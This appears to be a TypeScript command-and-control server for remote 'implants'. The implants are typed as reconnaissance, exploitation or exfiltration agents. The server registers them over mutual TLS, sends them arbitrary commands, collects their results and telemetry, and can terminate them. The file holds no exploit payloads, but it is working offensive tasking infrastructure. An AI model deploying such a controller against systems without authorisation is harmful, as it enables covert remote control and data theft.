import WebSocket, { WebSocketServer } from "ws";
import https from "https";
import fs from "fs";
import { db } from "../db";
import {
  rustNexusImplants,
  rustNexusTasks,
  rustNexusTaskResults,
  rustNexusCertificates,
  rustNexusTelemetry,
} from "@shared/schema";
import { eq, and, inArray, sql } from "drizzle-orm";
import { taskDistributor } from "./rust-nexus-task-distributor";

/**
 * rust-nexus Agentic Implants Controller
 * WebSocket server with mTLS for managing autonomous implant agents
 */

// Message type enums
export enum MessageType {
  // Implant -> Controller
  REGISTER = "register",
  HEARTBEAT = "heartbeat",
  TASK_REQUEST = "task_request",
  TASK_RESULT = "task_result",
  TELEMETRY = "telemetry",
  ERROR = "error",

  // Controller -> Implant
  REGISTER_ACK = "register_ack",
  TASK_ASSIGN = "task_assign",
  CONFIG_UPDATE = "config_update",
  TERMINATE = "terminate",
}

// WebSocket message interfaces
export interface WebSocketMessage {
  type: MessageType;
  messageId: string;
  timestamp: string;
  payload: any;
}

export interface ImplantRegistration {
  implantName: string;
  implantType: "reconnaissance" | "exploitation" | "exfiltration" | "general";
  version: string;
  hostname: string;
  osType: string;
  osVersion?: string;
  architecture: "x86" | "x64" | "arm" | "arm64";
  ipAddress?: string;
  macAddress?: string;
  certificateSerial: string;
  certificateFingerprint: string;
  capabilities: string[];
  metadata?: Record<string, any>;
}

export interface HeartbeatPayload {
  implantId: string;
  status: "idle" | "busy";
  connectionQuality: number;
  activeTasks: number;
}

export interface TaskRequest {
  implantId: string;
  maxTasks: number;
  currentLoad: number;
}

export interface TaskResult {
  taskId: string;
  implantId: string;
  resultType: "stdout" | "stderr" | "file" | "json" | "binary" | "error";
  resultData?: string;
  resultJson?: any;
  exitCode?: number;
  executionTimeMs: number;
  errorMessage?: string;
  metadata?: Record<string, any>;
}

export interface TelemetryPayload {
  implantId: string;
  cpuUsagePercent?: number;
  memoryUsageMb?: number;
  memoryTotalMb?: number;
  networkLatencyMs?: number;
  activeTasks: number;
  queuedTasks: number;
  healthStatus: "healthy" | "degraded" | "unhealthy" | "critical";
  healthScore?: number;
  customMetrics?: Record<string, any>;
}

export interface ImplantConnection {
  ws: WebSocket;
  implantId?: string;
  implantName?: string;
  certificateFingerprint: string;
  connectedAt: Date;
  lastHeartbeat: Date;
  authenticated: boolean;
}

class RustNexusController {
  private wss: WebSocketServer | null = null;
  private httpsServer: https.Server | null = null;
  private connections = new Map<string, ImplantConnection>();
  private heartbeatInterval: NodeJS.Timeout | null = null;
  private taskDistributionInterval: NodeJS.Timeout | null = null;

  /**
   * Start the WebSocket server with mTLS
   */
  async start(options: {
    port: number;
    tlsCertPath: string;
    tlsKeyPath: string;
    tlsCaPath: string;
  }): Promise<void> {
    const { port, tlsCertPath, tlsKeyPath, tlsCaPath } = options;

    // Create HTTPS server with mTLS
    this.httpsServer = https.createServer({
      cert: fs.readFileSync(tlsCertPath),
      key: fs.readFileSync(tlsKeyPath),
      ca: fs.readFileSync(tlsCaPath),
      requestCert: true, // Require client certificate
      rejectUnauthorized: true, // Reject unauthorized certificates
    });

    // Create WebSocket server
    this.wss = new WebSocketServer({ server: this.httpsServer });

    // Handle new connections
    this.wss.on("connection", (ws, req) => {
      this.handleConnection(ws, req);
    });

    // Start HTTPS server
    await new Promise<void>((resolve, reject) => {
      this.httpsServer!.listen(port, () => {
        console.log(`[RustNexusController] Server started on port ${port} with mTLS`);
        resolve();
      });
      this.httpsServer!.on("error", reject);
    });

    // Start background processes
    this.startHeartbeatMonitor();
    this.startTaskDistribution();
  }

  /**
   * Stop the WebSocket server
   */
  async stop(): Promise<void> {
    console.log("[RustNexusController] Stopping server...");

    // Clear intervals
    if (this.heartbeatInterval) {
      clearInterval(this.heartbeatInterval);
      this.heartbeatInterval = null;
    }
    if (this.taskDistributionInterval) {
      clearInterval(this.taskDistributionInterval);
      this.taskDistributionInterval = null;
    }

    // Close all connections
    for (const [key, conn] of this.connections.entries()) {
      conn.ws.close(1000, "Server shutting down");
      this.connections.delete(key);
    }

    // Close servers
    if (this.wss) {
      this.wss.close();
      this.wss = null;
    }
    if (this.httpsServer) {
      await new Promise<void>((resolve) => {
        this.httpsServer!.close(() => resolve());
      });
      this.httpsServer = null;
    }

    console.log("[RustNexusController] Server stopped");
  }

  /**
   * Handle new WebSocket connection
   */
  private handleConnection(ws: WebSocket, req: any): void {
    // Extract certificate fingerprint from TLS connection
    const cert = req.socket.getPeerCertificate();
    if (!cert || !cert.fingerprint256) {
      console.error("[RustNexusController] No client certificate provided");
      ws.close(1008, "Client certificate required");
      return;
    }

    const fingerprint = cert.fingerprint256;
    const connectionId = this.generateConnectionId();

    // Create connection object
    const connection: ImplantConnection = {
      ws,
      certificateFingerprint: fingerprint,
      connectedAt: new Date(),
      lastHeartbeat: new Date(),
      authenticated: false,
    };

    this.connections.set(connectionId, connection);

    console.log(`[RustNexusController] New connection: ${connectionId} (cert: ${fingerprint})`);

    // Handle messages
    ws.on("message", async (data) => {
      try {
        const message: WebSocketMessage = JSON.parse(data.toString());
        await this.handleMessage(connectionId, message);
      } catch (error) {
        console.error("[RustNexusController] Error handling message:", error);
        this.sendMessage(ws, {
          type: MessageType.ERROR,
          messageId: this.generateMessageId(),
          timestamp: new Date().toISOString(),
          payload: { error: "Invalid message format" },
        });
      }
    });

    // Handle disconnection
    ws.on("close", () => {
      this.handleDisconnection(connectionId);
    });

    // Handle errors
    ws.on("error", (error) => {
      console.error(`[RustNexusController] WebSocket error for ${connectionId}:`, error);
    });
  }

  /**
   * Handle incoming messages from implants
   */
  private async handleMessage(
    connectionId: string,
    message: WebSocketMessage
  ): Promise<void> {
    const connection = this.connections.get(connectionId);
    if (!connection) {
      console.error(`[RustNexusController] Connection not found: ${connectionId}`);
      return;
    }

    console.log(
      `[RustNexusController] Message from ${connectionId}: ${message.type}`
    );

    switch (message.type) {
      case MessageType.REGISTER:
        await this.handleRegistration(connectionId, connection, message.payload);
        break;

      case MessageType.HEARTBEAT:
        await this.handleHeartbeat(connectionId, connection, message.payload);
        break;

      case MessageType.TASK_REQUEST:
        await this.handleTaskRequest(connectionId, connection, message.payload);
        break;

      case MessageType.TASK_RESULT:
        await this.handleTaskResult(connectionId, connection, message.payload);
        break;

      case MessageType.TELEMETRY:
        await this.handleTelemetry(connectionId, connection, message.payload);
        break;

      default:
        console.warn(`[RustNexusController] Unknown message type: ${message.type}`);
    }
  }

  /**
   * Handle implant registration
   */
  private async handleRegistration(
    connectionId: string,
    connection: ImplantConnection,
    payload: ImplantRegistration
  ): Promise<void> {
    try {
      // Verify certificate matches payload
      if (payload.certificateFingerprint !== connection.certificateFingerprint) {
        throw new Error("Certificate fingerprint mismatch");
      }

      // Check if implant already registered
      const existing = await db.query.rustNexusImplants.findFirst({
        where: eq(rustNexusImplants.implantName, payload.implantName),
      });

      let implantId: string;

      if (existing) {
        // Update existing implant
        implantId = existing.id;
        await db
          .update(rustNexusImplants)
          .set({
            status: "connected",
            lastHeartbeat: new Date(),
            firstConnectionAt: existing.firstConnectionAt || new Date(),
            lastConnectionAt: new Date(),
            connectionQuality: 100,
            ipAddress: payload.ipAddress,
            version: payload.version,
            updatedAt: new Date(),
          })
          .where(eq(rustNexusImplants.id, implantId));

        console.log(`[RustNexusController] Implant reconnected: ${payload.implantName}`);
      } else {
        // Register new implant (requires a valid user ID for created_by)
        // For now, we'll use a system user ID. In production, this should be configurable.
        const systemUserId = "00000000-0000-0000-0000-000000000000"; // Placeholder

        const [newImplant] = await db
          .insert(rustNexusImplants)
          .values({
            implantName: payload.implantName,
            implantType: payload.implantType,
            version: payload.version,
            hostname: payload.hostname,
            osType: payload.osType,
            osVersion: payload.osVersion,
            architecture: payload.architecture,
            ipAddress: payload.ipAddress,
            macAddress: payload.macAddress,
            certificateSerial: payload.certificateSerial,
            certificateFingerprint: payload.certificateFingerprint,
            authToken: this.generateAuthToken(),
            capabilities: payload.capabilities,
            status: "connected",
            lastHeartbeat: new Date(),
            firstConnectionAt: new Date(),
            lastConnectionAt: new Date(),
            connectionQuality: 100,
            metadata: payload.metadata || {},
            createdBy: systemUserId,
          })
          .returning();

        implantId = newImplant.id;
        console.log(`[RustNexusController] New implant registered: ${payload.implantName}`);
      }

      // Update connection
      connection.implantId = implantId;
      connection.implantName = payload.implantName;
      connection.authenticated = true;
      connection.lastHeartbeat = new Date();

      // Send registration acknowledgment
      this.sendMessage(connection.ws, {
        type: MessageType.REGISTER_ACK,
        messageId: this.generateMessageId(),
        timestamp: new Date().toISOString(),
        payload: {
          implantId,
          status: "registered",
          heartbeatInterval: 30000, // 30 seconds
        },
      });
    } catch (error) {
      console.error("[RustNexusController] Registration error:", error);
      this.sendMessage(connection.ws, {
        type: MessageType.ERROR,
        messageId: this.generateMessageId(),
        timestamp: new Date().toISOString(),
        payload: { error: "Registration failed" },
      });
    }
  }

  /**
   * Handle heartbeat from implant
   */
  private async handleHeartbeat(
    connectionId: string,
    connection: ImplantConnection,
    payload: HeartbeatPayload
  ): Promise<void> {
    if (!connection.implantId) {
      console.error("[RustNexusController] Heartbeat from unregistered implant");
      return;
    }

    // Update last heartbeat
    connection.lastHeartbeat = new Date();

    // Update database
    await db
      .update(rustNexusImplants)
      .set({
        status: payload.status,
        lastHeartbeat: new Date(),
        connectionQuality: payload.connectionQuality,
        updatedAt: new Date(),
      })
      .where(eq(rustNexusImplants.id, connection.implantId));
  }

  /**
   * Handle task request from implant
   */
  private async handleTaskRequest(
    connectionId: string,
    connection: ImplantConnection,
    payload: TaskRequest
  ): Promise<void> {
    if (!connection.implantId) {
      console.error("[RustNexusController] Task request from unregistered implant");
      return;
    }

    // Get pending tasks for this implant
    const tasks = await db.query.rustNexusTasks.findMany({
      where: and(
        eq(rustNexusTasks.implantId, connection.implantId),
        inArray(rustNexusTasks.status, ["queued", "assigned"])
      ),
      orderBy: (tasks, { desc }) => [desc(tasks.priority), tasks.createdAt],
      limit: payload.maxTasks,
    });

    // Send tasks to implant
    for (const task of tasks) {
      this.sendMessage(connection.ws, {
        type: MessageType.TASK_ASSIGN,
        messageId: this.generateMessageId(),
        timestamp: new Date().toISOString(),
        payload: {
          taskId: task.id,
          taskType: task.taskType,
          taskName: task.taskName,
          command: task.command,
          parameters: task.parameters,
          environmentVars: task.environmentVars,
          timeoutSeconds: task.timeoutSeconds,
          priority: task.priority,
        },
      });

      // Update task status
      await db
        .update(rustNexusTasks)
        .set({
          status: "assigned",
          assignedAt: new Date(),
          updatedAt: new Date(),
        })
        .where(eq(rustNexusTasks.id, task.id));
    }
  }

  /**
   * Handle task result from implant
   */
  private async handleTaskResult(
    connectionId: string,
    connection: ImplantConnection,
    payload: TaskResult
  ): Promise<void> {
    if (!connection.implantId) {
      console.error("[RustNexusController] Task result from unregistered implant");
      return;
    }

    try {
      // Store task result
      await db.insert(rustNexusTaskResults).values({
        taskId: payload.taskId,
        implantId: payload.implantId,
        resultType: payload.resultType,
        resultData: payload.resultData,
        resultJson: payload.resultJson,
        exitCode: payload.exitCode,
        executionTimeMs: payload.executionTimeMs,
        metadata: payload.metadata || {},
      });

      // Update task status
      const status = payload.errorMessage ? "failed" : "completed";
      await db
        .update(rustNexusTasks)
        .set({
          status,
          completedAt: new Date(),
          executionTimeMs: payload.executionTimeMs,
          errorMessage: payload.errorMessage,
          updatedAt: new Date(),
        })
        .where(eq(rustNexusTasks.id, payload.taskId));

      console.log(`[RustNexusController] Task ${payload.taskId} ${status}`);
    } catch (error) {
      console.error("[RustNexusController] Error storing task result:", error);
    }
  }

  /**
   * Handle telemetry from implant
   */
  private async handleTelemetry(
    connectionId: string,
    connection: ImplantConnection,
    payload: TelemetryPayload
  ): Promise<void> {
    if (!connection.implantId) {
      console.error("[RustNexusController] Telemetry from unregistered implant");
      return;
    }

    try {
      await db.insert(rustNexusTelemetry).values({
        implantId: payload.implantId,
        cpuUsagePercent: payload.cpuUsagePercent,
        memoryUsageMb: payload.memoryUsageMb,
        memoryTotalMb: payload.memoryTotalMb,
        networkLatencyMs: payload.networkLatencyMs,
        activeTasks: payload.activeTasks,
        queuedTasks: payload.queuedTasks,
        healthStatus: payload.healthStatus,
        healthScore: payload.healthScore,
        customMetrics: payload.customMetrics || {},
        collectedAt: new Date(),
      });
    } catch (error) {
      console.error("[RustNexusController] Error storing telemetry:", error);
    }
  }

  /**
   * Handle disconnection
   */
  private async handleDisconnection(connectionId: string): Promise<void> {
    const connection = this.connections.get(connectionId);
    if (!connection) return;

    console.log(`[RustNexusController] Disconnected: ${connectionId}`);

    // Update implant status if authenticated
    if (connection.implantId) {
      await db
        .update(rustNexusImplants)
        .set({
          status: "disconnected",
          updatedAt: new Date(),
        })
        .where(eq(rustNexusImplants.id, connection.implantId));
    }

    // Remove connection
    this.connections.delete(connectionId);
  }

  /**
   * Start heartbeat monitor
   * Checks for stale connections and marks implants as disconnected
   */
  private startHeartbeatMonitor(): void {
    this.heartbeatInterval = setInterval(async () => {
      const now = new Date();
      const staleThreshold = 90000; // 90 seconds

      for (const [connectionId, connection] of this.connections.entries()) {
        const timeSinceHeartbeat = now.getTime() - connection.lastHeartbeat.getTime();

        if (timeSinceHeartbeat > staleThreshold) {
          console.warn(
            `[RustNexusController] Stale connection detected: ${connectionId}`
          );
          connection.ws.close(1000, "Heartbeat timeout");
          this.handleDisconnection(connectionId);
        }
      }
    }, 30000); // Check every 30 seconds
  }

  /**
   * Start task distribution
   * Periodically runs intelligent task assignment and maintenance
   */
  private startTaskDistribution(): void {
    this.taskDistributionInterval = setInterval(async () => {
      try {
        // 1. Run intelligent task assignment algorithm
        const assignments = await taskDistributor.assignTasksToImplants({
          maxAssignments: 50,
        });

        if (assignments.length > 0) {
          console.log(
            `[RustNexusController] Assigned ${assignments.length} tasks to implants`
          );
        }

        // 2. Handle priority scheduling (promote waiting tasks)
        await taskDistributor.priorityScheduler();

        // 3. Retry failed tasks with exponential backoff
        const retriedCount = await taskDistributor.retryFailedTasks();
        if (retriedCount > 0) {
          console.log(`[RustNexusController] Retried ${retriedCount} failed tasks`);
        }

        // 4. Mark permanent failures (max retries exceeded)
        const permanentFailures = await taskDistributor.markPermanentFailures();
        if (permanentFailures > 0) {
          console.log(
            `[RustNexusController] Marked ${permanentFailures} tasks as permanently failed`
          );
        }

        // 5. Handle timeouts
        const timeouts = await taskDistributor.handleTimeouts();
        if (timeouts > 0) {
          console.log(`[RustNexusController] ${timeouts} tasks timed out`);
        }

        // 6. Notify implants with newly assigned tasks
        const implantIds = Array.from(this.connections.values())
          .filter((conn) => conn.authenticated && conn.implantId)
          .map((conn) => conn.implantId!);

        if (implantIds.length > 0) {
          const assignedTasks = await db.query.rustNexusTasks.findMany({
            where: and(
              inArray(rustNexusTasks.implantId, implantIds),
              eq(rustNexusTasks.status, "assigned")
            ),
            limit: 100,
          });

          // Group by implant
          const tasksByImplant = new Map<string, number>();
          for (const task of assignedTasks) {
            const count = tasksByImplant.get(task.implantId) || 0;
            tasksByImplant.set(task.implantId, count + 1);
          }

          // Notify implants
          for (const [implantId, taskCount] of tasksByImplant.entries()) {
            const connection = Array.from(this.connections.values()).find(
              (conn) => conn.implantId === implantId
            );

            if (connection) {
              console.log(
                `[RustNexusController] Notifying ${connection.implantName} of ${taskCount} assigned tasks`
              );
              // Implant will send a task_request to fetch tasks
            }
          }
        }
      } catch (error) {
        console.error("[RustNexusController] Task distribution error:", error);
      }
    }, 10000); // Run every 10 seconds
  }

  /**
   * Send message to WebSocket client
   */
  private sendMessage(ws: WebSocket, message: WebSocketMessage): void {
    if (ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify(message));
    }
  }

  /**
   * Generate unique connection ID
   */
  private generateConnectionId(): string {
    return `conn-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
  }

  /**
   * Generate unique message ID
   */
  private generateMessageId(): string {
    return `msg-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
  }

  /**
   * Generate auth token
   */
  private generateAuthToken(): string {
    return `token-${Date.now()}-${Math.random().toString(36).substr(2, 16)}`;
  }

  /**
   * Get all connected implants
   */
  getConnectedImplants(): Array<{
    connectionId: string;
    implantId?: string;
    implantName?: string;
    connectedAt: Date;
    lastHeartbeat: Date;
  }> {
    return Array.from(this.connections.entries()).map(([id, conn]) => ({
      connectionId: id,
      implantId: conn.implantId,
      implantName: conn.implantName,
      connectedAt: conn.connectedAt,
      lastHeartbeat: conn.lastHeartbeat,
    }));
  }

  /**
   * Terminate an implant connection
   */
  async terminateImplant(implantId: string): Promise<void> {
    // Find connection
    const entry = Array.from(this.connections.entries()).find(
      ([_, conn]) => conn.implantId === implantId
    );

    if (entry) {
      const [connectionId, connection] = entry;

      // Send terminate message
      this.sendMessage(connection.ws, {
        type: MessageType.TERMINATE,
        messageId: this.generateMessageId(),
        timestamp: new Date().toISOString(),
        payload: { reason: "Terminated by operator" },
      });

      // Close connection
      connection.ws.close(1000, "Terminated");
      this.handleDisconnection(connectionId);
    }

    // Update database
    await db
      .update(rustNexusImplants)
      .set({
        status: "terminated",
        terminatedAt: new Date(),
        updatedAt: new Date(),
      })
      .where(eq(rustNexusImplants.id, implantId));
  }
}

// Export singleton instance
export const rustNexusController = new RustNexusController();
